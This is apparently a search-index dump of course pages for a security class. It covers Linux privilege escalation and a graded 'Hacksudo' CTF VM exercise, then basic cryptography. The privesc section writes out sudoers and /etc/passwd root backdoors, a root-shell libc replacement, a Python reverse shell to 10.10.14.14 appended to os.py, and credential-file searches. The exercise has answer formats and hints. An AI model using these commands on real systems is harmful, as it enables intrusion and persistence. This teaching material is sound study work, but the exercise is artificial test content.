if you can overwrite the file /var/run/sudo/ts/sampleuser and you have a shell as that user with PID 1234, you can obtain sudo privileges without needing to know the password doing: ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser","title":"/var/run/sudo/ts/"},{"location":"CS315/Week%2010/#etcsudoers-etcsudoersd","text":"The file /etc/sudoers and the files inside /etc/sudoers.d configure who can use sudo and how. This files by default can only be read by user root and group root . If you can read this file you could be able to obtain some interesting information , and if you can write any file you will be able to escalate privileges . ls -l /etc/sudoers /etc/sudoers.d/ ls -ld /etc/sudoers.d/ If you can write you can abuse this permissions echo \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers echo \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers.d/README Other way to abuse these permissions: # makes it so every terminal can sudo echo \"Defaults !tty_tickets\" > /etc/sudoers.d/win # makes it so sudo never times out echo \"Defaults timestamp_timeout=-1\" >> /etc/sudoers.d/win","title":"/etc/sudoers, /etc/sudoers.d"},{"location":"CS315/Week%2010/#doas","text":"There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf permit nopass demo as root cmd vim","title":"DOAS"},{"location":"CS315/Week%2010/#sudo-hijacking","text":"If you know that a user usually connects to a machine and uses sudo to escalate privileges and you got a shell within that user context, you can create a new sudo executable that will execute your code as root and then the users command. Then, modify the $PATH of the user context (for example adding the new path in .bash_profile) so we the user executed sudo, your sudo executable is executed. Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example sudo-piggyback modifies ~/.bashrc , ~/.zshrc , ~/.bash_profile . You can find another example in bashdoor.py","title":"Sudo Hijacking"},{"location":"CS315/Week%2010/#shared-library","text":"","title":"Shared Library"},{"location":"CS315/Week%2010/#ldso","text":"The file /etc/ld.so.conf indicates where are loaded the configurations files from . Typically, this file contains the following path: include /etc/ld.so.conf.d/*.conf That means that the configuration files from /etc/ld.so.conf.d/*.conf will be read. This configuration files points to another folders where libraries are going to be searched for. For example, the content of /etc/ld.so.conf.d/libc.conf is /usr/local/lib . This means that the system will search for libraries inside /usr/local/lib . If for some reason a user has write permissions on any of the paths indicated: /etc/ld.so.conf , /etc/ld.so.conf.d/ , any file inside /etc/ld.so.conf.d/ or any folder indicated inside any config file inside /etc/ld.so.conf.d/*.conf he may be able to escalate privileges. Take a look about how to exploit this misconfiguration in the following page: https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example","title":"ld.so"},{"location":"CS315/Week%2010/#rpath","text":"level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\" 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000f (RPATH) Library rpath: [/var/tmp/flag15] level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x0068c000) libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x005bb000) By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable. level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/ level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x005b0000) libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x00737000) Then create an evil library in /var/tmp with gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6 #include<stdlib.h> #define SHELL \"/bin/sh\" int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { char *file = SHELL; char *argv[] = {SHELL,0}; setresuid(geteuid(),geteuid(), geteuid()); execve(file,argv,0); }","title":"RPATH"},{"location":"CS315/Week%2010/#capabilities","text":"Linux capabilities provide a subset of the available root privileges to a process . This effectively breaks up root privileges into smaller and distinctive units . Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. Read the following page to learn more about capabilities and how to abuse them : https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities","title":"Capabilities"},{"location":"CS315/Week%2010/#directory-permissions","text":"In a directory the bit for execute implies that the user affected can \" cd \" into the folder. The read bit implies the user can list the files , and the write bit implies the user can delete and create new files .","title":"Directory permissions"},{"location":"CS315/Week%2010/#acls","text":"ACLs are a second level of discretionary permissions, that may override the standard ugo/rwx ones. When used correctly they can grant you a better granularity in setting access to a file or a directory , for example by giving or denying access to a specific user that is neither the file owner, nor in the group owner (from here ). Give user \"kali\" read and write permissions over a file: setfacl -m u:kali:rw file.txt Get files with specific ACLs from the system: getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null","title":"ACLs"},{"location":"CS315/Week%2010/#open-shell-sessions","text":"In old versions you may hijack some shell session of a different user ( root ). In newest versions you will be able to connect to screen sessions only of your own user . However, you could find interesting information inside of the session .","title":"Open shell sessions"},{"location":"CS315/Week%2010/#screen-sessions-hijacking","text":"List screen sessions screen -ls Attach to a session screen -dr <session> #The -d is to detacche whoever is attached to it screen -dr 3350.foo #In the example of the image","title":"screen sessions hijacking"},{"location":"CS315/Week%2010/#tmux-sessions-hijacking","text":"Apparently this was a problem with old tmux versions . I wasn't able to hijack a tmux (v2.1) session created by root from a non-privileged user. List tmux sessions tmux ls ps aux | grep tmux #Search for tmux consoles not using default folder for sockets tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess Attach to a session tmux attach -t myname #If you write something in this session it will appears in the other opened one tmux attach -d -t myname #First detach the sessinos from the other console and then access it yourself tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket Check valentine box from HTB for an example.","title":"tmux sessions hijacking"},{"location":"CS315/Week%2010/#ssh","text":"","title":"SSH"},{"location":"CS315/Week%2010/#debian-openssl-predictable-prng-cve-2008-0166","text":"All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug. This bug caused that when creating in those OS a new ssh key only 32,768 variations were possible . This means that all the possibilities can be calculated and having the ssh public key you can search for the corresponding private key . You can find the calculated possibilities here: https://github.com/g0tmi1k/debian-ssh","title":"Debian OpenSSL Predictable PRNG - CVE-2008-0166"},{"location":"CS315/Week%2010/#ssh-interesting-configuration-values","text":"PasswordAuthentication: Specifies whether password authentication is allowed. The default is no . PubkeyAuthentication: Specifies whether public key authentication is allowed. The default is yes . PermitEmptyPasswords : When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is no .","title":"SSH Interesting configuration values"},{"location":"CS315/Week%2010/#permitrootlogin","text":"Specifies whether root can log in using ssh, default is no . Possible values: yes : root can login using password and private key without-password or prohibit-password : root can only login with private key forced-commands-only : Root can login only using privatekey cand if the commands options is specified no : no","title":"PermitRootLogin"},{"location":"CS315/Week%2010/#authorizedkeysfile","text":"Specifies files that contains the public keys that can be used for user authentication. I can contains tokens like %h , that will be replaced by the home directory. You can indicate absolute paths (starting in / ) or relative paths from the users home . For example: AuthorizedKeysFile .ssh/authorized_keys access That configuration will indicate that if you try to login with the private key of the user \" testusername \" ssh is going to compare the public key of your key with the ones located in /home/testusername/.ssh/authorized_keys and /home/testusername/access","title":"AuthorizedKeysFile"},{"location":"CS315/Week%2010/#forwardagentallowagentforwarding","text":"SSH agent forwarding allows you to use your local SSH keys instead of leaving keys (without passphrases!) sitting on your server. So, you will be able to jump via ssh to a host and from there jump to another host using the key located in your initial host . You need to set this option in $HOME/.ssh.config like this: Host example.com ForwardAgent yes Notice that if Host is * every time the user jumps to a different machine that host will be able to access the keys (which is a security issue). The file /etc/ssh_config can override this options and allow or denied this configuration. The file /etc/sshd_config can allow or denied ssh-agent forwarding with the keyword AllowAgentForwarding (default is allow). If you Forward Agent configured in an environment check here how to exploit it to escalate privileges .","title":"ForwardAgent/AllowAgentForwarding"},{"location":"CS315/Week%2010/#interesting-files","text":"","title":"Interesting Files"},{"location":"CS315/Week%2010/#profiles-files","text":"The file /etc/profile and the files under /etc/profile.d/ are scripts that are executed when a user run a new shell . Therefore, if you can write or modify any of the you can escalate privileges . ls -l /etc/profile /etc/profile.d/ If any weird profile script is found you should check it for sensitive details .","title":"Profiles files"},{"location":"CS315/Week%2010/#passwdshadow-files","text":"Depending on the OS the /etc/passwd and /etc/shadow files may be using a different name or there may be a backup. Therefore it's recommended find all of hem and check if you can read them and check if there are hashes inside the files: #Passwd equivalent files cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null #Shadow equivalent files cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null In some occasions you can find password hashes inside the /etc/passwd (or equivalent) file grep -v '^[^:]*:[x\\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null","title":"Passwd/Shadow Files"},{"location":"CS315/Week%2010/#writable-etcpasswd","text":"First generate a password with one of the following commands. openssl passwd -1 -salt hacker hacker mkpasswd -m SHA-512 hacker python2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")' Then add the user hacker and add the generated password. hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash You can now use the su command with hacker:hacker Alternatively you can use the following lines to add a dummy user without a password. WARNING: you might degrade the current security of the machine. echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd su - dummy NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd , also the /etc/shadow is renamed to /etc/spwd.db . You should check if you can write in some sensitive file . For example, can you write to some service configuration file ? find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody for g in `groups`; do find \\( -type f -or -type d \\) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user For example, if the machine is running a tomcat server and you can modify the Tomcat service configuration file inside /etc/systemd/, then you can modify the lines: ExecStart=/path/to/backdoor User=root Group=root Your backdoor will be executed the next time that tomcat is started.","title":"Writable /etc/passwd"},{"location":"CS315/Week%2010/#check-folders","text":"The following folders may contain backups or interesting information: /tmp , /var/tmp , /var/backups, /var/mail, /var/spool/mail, /etc/exports, /root (Probably you won't be able to read the last one but try) ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root","title":"Check Folders"},{"location":"CS315/Week%2010/#weird-locationowned-files","text":"#root owned files in /home folders find /home -user root 2>/dev/null #Files owned by other users in folders owned by me for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \\; 2>/dev/null; done #Files owned by root, readable by me but no world readable find / -type f -user root ! -perm -o=r 2>/dev/null #Files owned by me or world writable find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"$HOME/*\" 2>/dev/null #Writable files by each group I belong to for g in `groups`; do printf \" Group $g:\\n\"; find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"$HOME/*\" 2>/dev/null done done","title":"Weird Location/Owned files"},{"location":"CS315/Week%2010/#modified-files-in-last-mins","text":"find / -type f -mmin -5 ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"/run/*\" ! -path \"/dev/*\" ! -path \"/var/lib/*\" 2>/dev/null","title":"Modified files in last mins"},{"location":"CS315/Week%2010/#sqlite-db-files","text":"find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null","title":"Sqlite DB files"},{"location":"CS315/Week%2010/#_history-sudo_as_admin_successful-profile-bashrc-httpdconf-plan-htpasswd-git-credentials-rhosts-hostsequiv-dockerfile-docker-composeyml-files","text":"fils=`find / -type f \\( -name \"*_history\" -o -name \".sudo_as_admin_successful\" -o -name \".profile\" -o -name \"*bashrc\" -o -name \"httpd.conf\" -o -name \"*.plan\" -o -name \".htpasswd\" -o -name \".git-credentials\" -o -name \"*.rhosts\" -o -name \"hosts.equiv\" -o -name \"Dockerfile\" -o -name \"docker-compose.yml\" \\) 2>/dev/null`Hidden files","title":"*_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files"},{"location":"CS315/Week%2010/#hidden-files","text":"find / -type f -iname \".*\" -ls 2>/dev/null","title":"Hidden files"},{"location":"CS315/Week%2010/#scriptbinaries-in-path","text":"for d in `echo $PATH | tr \":\" \"\\n\"`; do find $d -name \"*.sh\" 2>/dev/null; done for d in `echo $PATH | tr \":\" \"\\n\"`; do find $d -type -f -executable 2>/dev/null; done","title":"Script/Binaries in PATH"},{"location":"CS315/Week%2010/#web-files","text":"ls -alhR /var/www/ 2>/dev/null ls -alhR /srv/www/htdocs/ 2>/dev/null ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ 2>/dev/null","title":"Web files"},{"location":"CS315/Week%2010/#backups","text":"find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \\( -name \"*backup*\" -o -name \"*\\.bak\" -o -name \"*\\.bck\" -o -name \"*\\.bk\" \\) 2>/dev/nulll","title":"Backups"},{"location":"CS315/Week%2010/#known-files-containing-passwords","text":"Read the code of linPEAS , it searches for several possible files that could contain passwords . Other interesting tool that you can use to do so is: LaZagne which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.","title":"Known files containing passwords"},{"location":"CS315/Week%2010/#logs","text":"If you can read logs, you may be able to find interesting/confidential information inside of them . The more strange the log is, the more interesting will be (probably). Also, some \" bad \" configured (backdoored?) audit logs may allow you to record passwords inside audit logs as explained in this post: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/. aureport --tty | grep -E \"su |sudo \" | sed -E \"s,su|sudo,${C}[1;31m&${C}[0m,g\" grep -RE 'comm=\"su\"|comm=\"sudo\"' /var/log* 2>/dev/null In order to read logs the group adm will be really helpful.","title":"Logs"},{"location":"CS315/Week%2010/#shell-files","text":"~/.bash_profile # if it exists, read once when you log in to the shell ~/.bash_login # if it exists, read once if .bash_profile doesn't exist ~/.profile # if it exists, read once if the two above don't exist /etc/profile # only read if none of the above exist ~/.bashrc # if it exists, read every time you start a new shell ~/.bash_logout # if it exists, read when the login shell exits ~/.zlogin #zsh shell ~/.zshrc #zsh shell","title":"Shell files"},{"location":"CS315/Week%2010/#generic-creds-searchregex","text":"You should also check for files containing the word \" password \" in it's name or inside the content , also check for IPs and emails inside logs, or hashes regexps. I'm not going to list here how to do all of this but if you are interested you can check the last checks that linpeas perform.","title":"Generic Creds Search/Regex"},{"location":"CS315/Week%2010/#writable-files","text":"","title":"Writable files"},{"location":"CS315/Week%2010/#python-library-hijacking","text":"If you know from where a python script is going to be executed and you can write inside that folder or you can modify python libraries , you can modify the os library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library). To backdoor the library just add at the end of the os.py library the following line (change IP and PORT): import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.14\",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);","title":"Python library hijacking"},{"location":"CS315/Week%2010/#logrotate-exploitation","text":"There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location . If logrotate is being executed by root , then the user will be able to write any file in /etc/bash_completion.d/ that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder , you can privesc (on most linux distributions, logrotate is executed automatically once a day as user root ). Also, check if apart of /var/log there are more files being rotated . This vulnerability affects logrotate version 3.15.1 and below More detailed information about the vulnerability can be found in this page: https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition. You can exploit this vulnerability with logrotten . This vulnerability is very similar to CVE-2016-1247 (nginx logs), so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.","title":"Logrotate exploitation"},{"location":"CS315/Week%2010/#etcsysconfignetwork-scripts-centosredhat","text":"If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can adjust an existing one, then your system is pwned . Network scripts, ifcg-eth0 for example are used for network connections. The look exactly like .INI files. However, they are ~~sourced~~ on Linux by Network Manager (dispatcher.d). In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space . Which means; everything after the first blank space is executed as root . For example: /etc/sysconfig/network-scripts/ifcfg-1337 NAME=Network /bin/id ONBOOT=yes DEVICE=eth0 ( Note the black space between Network and /bin/id ) Vulnerability reference: https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f","title":"/etc/sysconfig/network-scripts/ (Centos/Redhat)"},{"location":"CS315/Week%2010/#init-initd-systemd-and-rcd","text":"/etc/init.d contains scripts used by the System V init tools (SysVinit). This is the traditional service management package for Linux , containing the init program (the first process that is run when the kernel has finished initializing\u00b9) as well as some infrastructure to start and stop services and configure them. Specifically, files in /etc/init.d are shell scripts that respond to start , stop , restart , and (when supported) reload commands to manage a particular service. These scripts can be invoked directly or (most commonly) via some other trigger (typically the presence of a symbolic link in /etc/rc?.d/ ). (From here ) Other alternative to this folder is /etc/rc.d/init.d in Redhat /etc/init contains configuration files used by Upstart . Upstart is a young service management package championed by Ubuntu. Files in /etc/init are configuration files telling Upstart how and when to start , stop , reload the configuration, or query the status of a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. In fact, the SysVinit scripts are processed by a compatibility layer in Upstart. (From here ) systemd is a Linux initialization system and service manager that includes features like on-demand starting of daemons , mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. (From here ) Files that ships in packages downloaded from distribution repository go into /usr/lib/systemd/ . Modifications done by system administrator (user) go into /etc/systemd/system/ .","title":"init, init.d, systemd, and rc.d"},{"location":"CS315/Week%2010/#other-tricks","text":"","title":"Other Tricks"},{"location":"CS315/Week%2010/#nfs-privilege-escalation","text":"https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe","title":"NFS Privilege escalation"},{"location":"CS315/Week%2010/#escaping-from-restricted-shells","text":"https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash","title":"Escaping from restricted Shells"},{"location":"CS315/Week%2010/#cisco-vmanage","text":"https://book.hacktricks.xyz/linux-unix/privilege-escalation/cisco-vmanage","title":"Cisco - vmanage"},{"location":"CS315/Week%2010/#kernel-security-protections","text":"https://github.com/a13xp0p0v/kconfig-hardened-check https://github.com/a13xp0p0v/linux-kernel-defence-map","title":"Kernel Security Protections"},{"location":"CS315/Week%2010/#more-help","text":"Static impacket binaries","title":"More help"},{"location":"CS315/Week%2010/#linuxunix-privesc-tools","text":"","title":"Linux/Unix Privesc Tools"},{"location":"CS315/Week%2010/#best-tool-to-look-for-linux-local-privilege-escalation-vectors-linpeas","text":"LinEnum : https://github.com/rebootuser/LinEnum(-t option) Enumy : https://github.com/luke-goddard/enumy Unix Privesc Check: http://pentestmonkey.net/tools/audit/unix-privesc-check Linux Priv Checker: www.securitysift.com/download/linuxprivchecker.py BeeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux Kernelpop: Enumerate kernel vulns ins linux and MAC https://github.com/spencerdodd/kernelpop Mestaploit: multi/recon/local_exploit_suggester Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester EvilAbigail (physical access): https://github.com/GDSSecurity/EvilAbigail Recopilation of more scripts : https://gh-dark.rauchg.now.sh/1N3/PrivEsc/tree/master/linux","title":"Best tool to look for Linux local privilege escalation vectors: LinPEAS"},{"location":"CS315/Week%2010/#bibliography","text":"https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://payatu.com/guide-linux-privilege-escalation/ https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744 http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html https://touhidshaikh.com/blog/?p=827 https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf https://github.com/frizb/Linux-Privilege-Escalation https://github.com/lucyoa/kernel-exploits https://github.com/rtcrowley/linux-private-i","title":"Bibliography"},{"location":"CS315/Week%2010/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%2010/#10-pt-hacksudo","text":"In this challenge, you need to download the following virtual machine to finish the challenges. The box was created with Virtualbox . Upon booting up use netdiscover tool to find the IP address. This is the target address based on whatever settings you have. You should verify the address just in case. You don't need to answer all questions in order. Skip some questions may not affect the next steps. Download: https://mega.nz/file/ix9VnA7Y#7LM1LXBta_kAeNrajXGkQhmwfbr5fIaQHykkWEPBjZY Mirror: https://pan.baidu.com/s/1D-YEa6cr3rcWXv49HgZtSw (Code: 1337)","title":"(10 pt) Hacksudo"},{"location":"CS315/Week%2010/#setup","text":"Environment setup should use VirtualBox history version (VirtualBox 6.1.28 has a bug with Hyper-V, I used VirtualBox 6.0.24 and worked properly). You should setup Network as the following: The virtual image should enter the following promption: Debian GNU/Linux 10 hacksudo fog tty1 eth0: 192.168.xx.xxx hacksudo login: _ The second line is the ip address of virtual machine. Open your web browser, you can find this page in VM's ip address: You are done with configuration, now you can hack the machine and solve the challenges! If the ip address hasn't shown up, you can find it as below: Open you terminal (powershell.exe in Windows), and use ipconfig /all to find your Host-only NET ip address. Use any tool to scan the ip 192.168.xx.0/24 and you can find the virtual machine ip address. Otherwise, you can also use arp -a to find your Host-only Network address, and usually VM's ip address is followed.","title":"Setup"},{"location":"CS315/Week%2010/#1-pt-port-scan","text":"After the port scan, you should find several services running in the box. What's the version of the mysql service? Answer: x.x.x-xx.x.xx-MariaDB-x+debxxxx (replace all x to your answer) Hint: you can use nmap for port scanning.","title":"(1 pt) Port scan"},{"location":"CS315/Week%2010/#1-pt-web-source-code","text":"Access the website on port 80 . You can find here's some hint for the subsequent steps. What's the GitHub repo address you found in the source code? Answer: https://github.com/xxxxxxxx/xxxxxxxxxxx (replace all x to your answer) Hint: press F12 on the keyboard to open the Developer's Tools to view the source code (may vary for different browsers).","title":"(1 pt) Web source code"},{"location":"CS315/Week%2010/#1-pt-web-directory-discover","text":"Using web directory scanning, you can find a txt file under the website. What's the name of this txt file? Answer: xxxx.txt (replace all x to your answer) Hint: gobuster and dirbuster are both good web directory/file discovery tools.","title":"(1 pt) Web directory discover"},{"location":"CS315/Week%2010/#1-pt-cms-vulnerability","text":"The CMS used in the website is CMS-MadeSimple . However, this CMS can be vulnerable in some versions. What's the version of CMS? Answer: x.x.x (replace all x to your answer) Hint: you can use whatweb to find out the version of services.","title":"(1 pt) CMS vulnerability"},{"location":"CS315/Week%2010/#1-pt-exploit-cms","text":"Now, using the vulnerability to find the username and the hashed password of the CMS. It's hard to break the hash string, but you can use this username to break other services on the server. The txt file you found above would help you to get the password for the ftp service on port 21 . What's the password (in plain text)? Answer: xxxxxx (replace all x to your answer) Hint: hydra is a widely used tool for password cracking.","title":"(1 pt) Exploit CMS"},{"location":"CS315/Week%2010/#1-pt-ftp-and-unzip","text":"Using the previous username and password, you can log into the FTP server. You may notice there's a zip file on the server. You need to break the password of the zip file. What's the password for the zip file? Answer: xxxxxx (replace all x to your answer) Hint: to crack the password of the zip files, you can check JohnTheRipper.","title":"(1 pt) FTP and unzip"},{"location":"CS315/Week%2010/#1-pt-caesar-cipher","text":"After extracting the hacksudoSTEGNO.wav , you need to find what's inside this file. Recall what you've got till now, and find the CMS password. What's the password for CMS? Answer: xxxxxxxxxxxx (replace all x to your answer) Hint: CyberChef contains many useful cryptography tools.","title":"(1 pt) Caesar Cipher"},{"location":"CS315/Week%2010/#1-pt-upload-rce-script","text":"You've got the CMS! Now you can enjoy accessing all website pages and put your files on the website. Why not let us dig deeper? Upload a PHP script to give you shell access. What's the first line of flag2.txt on the server? Answer: xxx xxxxxxxxxxxx xxxxx xxx xxx xxx xxxxx xxxxxx!!! (replace all x to your answer) Hint: here are some upload limits on the server. Find out how to bypass them. Hint: after uploading your RCE script, you can generate a reversed shell to get a pty shell (which would simplify your next steps).","title":"(1 pt) Upload RCE script"},{"location":"CS315/Week%2010/#1-pt-local-privilege-escalation","text":"User isro is your first target. Attack and switch to user isro . View the files of isro . What's the content of user.txt ? Answer: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (replace all x to your answer) Hint: /etc/shadow is a sensitive file and may contain a user hashed password.","title":"(1 pt) Local privilege escalation"},{"location":"CS315/Week%2010/#1-pt-root-privilege-escalation","text":"The final step: get root privilege. What's the content in the root.txt ? Answer: flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx} (replace all x to your answer) Hint: sudo has some suid things and you should take a look at them.","title":"(1 pt) Root privilege escalation"},{"location":"CS315/Week%2011/","text":"Week11 CRYPTO: Public Key Crypto Attacking Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code. The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis. What is cryptography used for? Uses in every day software Securing web traffic (passwords, communication, etc.) Securing copyrighted software code Malicious uses Hiding malicious communication Hiding malicious code Topics XOR Cesear Cipher Substitution Cipher Vigenere Cipher Hashing Functions RSA XOR Data Representation Data can be represented in different bases, an 'A' needs to be a numerical representation of Base 2 or binary so computers can understand them XOR Basics An XOR or eXclusive OR is a bitwise operation indicated by ^ and shown by the following truth table: A B A ^ B 0 0 0 0 1 1 1 0 1 1 1 0 So what XOR'ing bytes in the action 0xA0 ^ 0x2C translates to is: 1 0 1 0 0 0 0 0 0 0 1 0 1 1 0 0 1 0 0 0 1 1 0 0 0b10001100` is equivelent to `0x8C`, a cool property of XOR is that it is reversable meaning `0x8C ^ 0x2C = 0xA0` and `0x8C ^ 0xA0 = 0x2C What does this have to do with CTF? XOR is a cheap way to encrypt data with a password. Any data can be encrypted using XOR as shown in this Python example: >>> data = 'CAPTURETHEFLAG' >>> key = 'A' >>> encrypted = ''.join([chr(ord(x) ^ ord(key)) for x in data]) >>> encrypted '\\x02\\x00\\x11\\x15\\x14\\x13\\x04\\x15\\t\\x04\\x07\\r\\x00\\x06' >>> decrypted = ''.join([chr(ord(x) ^ ord(key)) for x in encrypted]) >>> decrypted 'CAPTURETHEFLAG' This can be extended using a multibyte key by iterating in parallel with the data. Exploiting XOR Encryption Single Byte XOR Encryption Single Byte XOR Encryption is trivial to bruteforce as there are only 255 key combinations to try. Multibyte XOR Encryption Multibyte XOR gets exponentially harder the longer the key, but if the encrypted text is long enough, character frequency analysis is a viable method to find the key. Character Frequency Analysis means that we split the cipher text into groups based on the number of characters in the key. These groups then are bruteforced using the idea that some letters appear more frequently in the english alphabet than others. Substitution Cipher A Substitution Cipher is system of encryption where different symobls substitute a normal alphabet. Caesar Cipher/ROT 13 The Caesar Cipher or Caesar Shift is a cipher which uses the alphabet in order to encode texts. CAESAR` encoded with a shift of 8 is `KIMAIZ` so `ABCDEFGHIJKLMNOPQRSTUVWXYZ` becomes `IJKLMNOPQRSTUVWXYZABCDEFGH ROT13 is the same thing but a fixed shift of 13, this is a trivial cipher to bruteforce because there are only 25 shifts. Vigenere Cipher A Vigenere Cipher is an extended Caesar Cipher where a message is encrypted using various Caesar shifted alphabets. The following table can be used to encode a message: Encryption For example, encrypting the text SUPERSECRET with CODE would follow this process: CODE gets padded to the length of SUPERSECRET so the key becomes CODECODECOD For each letter in SUPERSECRET we use the table to get the Alphabet to use, in this instance row C and column S The ciphertext's first letter then becomes U We eventually get UISITGHGTSW Decryption Go to the row of the key, in this case C Find the letter of the cipher text in this row, in this case U The column is the first letter of the decrypted ciphertext, so we get S After repeating this process we get back to SUPERSECRET Hashing Functions Hashing functions are one way functions which theoretically provide a unique output for every input. MD5, SHA-1, and other hashes which were considered secure are now found to have collisions or two different pieces of data which produce the same supposed unique output. String Hashing A string hash is a number or string generated using an algorithm that runs on text or data. The idea is that each hash should be unique to the text or data (although sometimes it isn\u2019t). For example, the hash for \u201cdog\u201d should be different from other hashes. You can use command line tools tools or online resources such as this one. Example: $ echo -n password | md5 5f4dcc3b5aa765d61d8327deb882cf99 Here, \u201cpassword\u201d is hashed with different hashing algorithms: SHA-1 : 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8 SHA-2 : 5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8 MD5 : 5F4DCC3B5AA765D61D8327DEB882CF99 CRC32 : BBEDA74F Generally, when verifying a hash visually, you can simply look at the first and last four characters of the string. File Hashing A file hash is a number or string generated using an algorithm that is run on text or data. The premise is that it should be unique to the text or data. If the file or text changes in any way, the hash will change. What is it used for? - File and data identification - Password/certificate storage comparison How can we determine the hash of a file? You can use the md5sum command (or similar). $ md5sum samplefile.txt 3b85ec9ab2984b91070128be6aae25eb samplefile.txt Hash Collisions A collision is when two pieces of data or text have the same cryptographic hash. This is very rare. What\u2019s significant about collisions is that they can be used to crack password hashes. Passwords are usually stored as hashes 